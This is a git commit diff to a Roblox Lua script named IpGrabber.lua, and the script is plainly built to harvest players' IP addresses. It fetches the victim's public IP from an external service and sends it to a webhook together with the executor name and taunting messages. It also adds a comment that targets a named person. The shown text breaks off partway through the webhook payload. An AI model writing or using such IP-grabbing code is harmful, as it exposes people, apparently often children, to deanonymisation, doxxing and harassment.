1146223822af9bd1eae38a8fc676c6f1b96dfd32
Limo <99534559+IamHrzn@users.noreply.github.com>
2022-07-12 12:11:53 +0200

    Update IpGrabber.lua

--- IpGrabber.lua
+++ IpGrabber.lua
@@ -1,24 +1,25 @@
+--[[ simple code
 local ip = tostring(game:HttpGet("https://api.ipify.org", true))
 print(ip)
 
 local plr = game.Players.LocalPlayer
 
-plr:Kick('Hello, '..plr.Name..' Your ip is '..ip)
+plr:Kick('Hello, '..plr.Name..' Your ip is '..ip)]]
 
 ---- Send ip to webhook (Thank you !Zy)
-
+-- koushal better watch out bro
 local webhookcheck =
    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
    secure_load and "Sentinel" or
    KRNL_LOADED and "Krnl" or
    SONA_LOADED and "Sona" or
-   "Kid with shit exploit"
+   "Kid with trash exploit"
 local ip = tostring(game:HttpGet("https://api.ipify.org", true))
 
 local url =
    "Webhook here"
 local data = {
-   ["content"] = "A retard just got ip grabbed",
+   ["content"] = "A kid just got ip grabbed",
    ["embeds"] = {
        {
            ["title"] = "Ez w",
